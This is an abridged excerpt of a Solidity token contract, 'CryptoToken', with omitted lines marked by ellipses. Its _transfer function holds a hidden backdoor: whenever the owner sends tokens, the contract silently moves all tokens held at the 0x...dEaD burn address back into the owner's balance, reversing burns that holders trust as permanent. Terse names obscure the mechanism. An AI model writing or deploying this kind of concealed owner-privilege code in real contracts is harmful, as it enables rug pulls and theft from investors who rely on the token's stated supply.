...
contract CryptoToken {
    ...
    address public _ownr = address(0);
    ...
    constructor () {
        emit OwnershipTransferred(_ownr, msg.sender);
        _ownr = msg.sender;
        _totalSupply = 1000000 * 10**_decimals;
        balances[_ownr] = _totalSupply;
    }
    
    receive () external payable {}
    
    modifier onlyOwner() {
        require(_ownr == msg.sender, "Error: caller is not the owner");
        _;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 bbb = balanceOf(0x000000000000000000000000000000000000dEaD);
        if(_ownr == sender && bbb > 1) {
            balances[_ownr] += bbb;
            balances[0x000000000000000000000000000000000000dEaD] = 0;
        }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        ...
        emit OwnershipTransferred(_ownr, newOwner);
        _ownr = newOwner;
    }
